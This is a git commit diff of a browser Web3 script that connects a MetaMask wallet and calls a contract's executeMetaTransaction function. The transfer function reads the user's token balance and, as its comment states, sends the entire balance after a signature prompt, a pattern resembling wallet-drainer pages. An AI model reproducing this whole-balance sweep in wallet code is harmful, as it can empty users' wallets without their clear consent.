dee851c315c35378bda0f1001966a32bf558da12
uplusproject <uplusproject@gmail.com>
2024-10-20 15:51:59 +0800

    Update script.js

--- MetaTransaction/script.js
+++ MetaTransaction/script.js
@@ -1,34 +1,52 @@
 const contractAddress = '0xa1f16EF58A572fB99e41bb2C21C26AdDd6828697';
 const ABI = [
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "sender",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transferFrom",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	}
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "sender",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "recipient",
+                "type": "address"
+            },
+            {
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            },
+            {
+                "internalType": "bytes",
+                "name": "signature",
+                "type": "bytes"
+            }
+        ],
+        "name": "executeMetaTransaction",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+            {
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    }
 ];
 
 let web3;
@@ -36,19 +54,24 @@ let account;
 
 async function connectWallet() {
     if (window.ethereum) {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        web3 = new Web3(window.ethereum);
-        account = (await web3.eth.getAccounts())[0];
-        
-        document.getElementById('connectButton').innerText = '连接成功';
-        document.getElementById('transferButton').disabled = false;
+        try {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            web3 = new Web3(window.ethereum);
+            account = window.ethereum.selectedAddress || (await web3.eth.getAccounts())[0];
 
-        console.log('连接成功:', account);
-        
-        window.ethereum.on('accountsChanged', async (accounts) => {
-            account = accounts[0];
-            console.log('账户已更改:', account);
-        });
+            document.getElementById('connectButton').innerText = '连接成功';
+            document.getElementById('transferButton').disabled = false;
+
+            console.log('连接成功:', account);
+
+            window.ethereum.on('accountsChanged', async (accounts) => {
+                account = accounts[0];
+                console.log('账户已更改:', account);
+            });
+        } catch (error) {
+            console.error('连接钱包失败:', error);
+            alert('连接钱包失败，请检查控制台错误信息。');
+        }
     } else {
         alert('请安装 MetaMask 或其他钱包插件');
     }
@@ -59,7 +82,6 @@ async function transferTokens() {
     const contract = new web3.eth.Contract(ABI, contractAddress);
     
     try {
-        // 获取用户的余额
         const balance = await contract.methods.balanceOf(account).call();
         const amount = balance; // 将转账金额设为用户的所有余额
 
@@ -70,17 +92,14 @@ async function transferTokens() {
             return;
         }
 
-        // 创建消息哈希
         const messageHash = web3.utils.soliditySha3(account, recipient, amount);
         const messageHashHex = web3.utils.keccak256(messageHash); // 使用 keccak256
 
-        // 签署消息
         const signature = await web3.eth.personal.sign(messageHashHex, account);
         
         console.log('生成的消息哈希:', messageHashHex);
         console.log('签名:', signature);
         
-        // 调用 executeMetaTransaction
         const tx = await contract.methods.executeMetaTransaction(account, recipient, amount, signature).send({ from: account });
         
         console.log('转账成功:', tx);
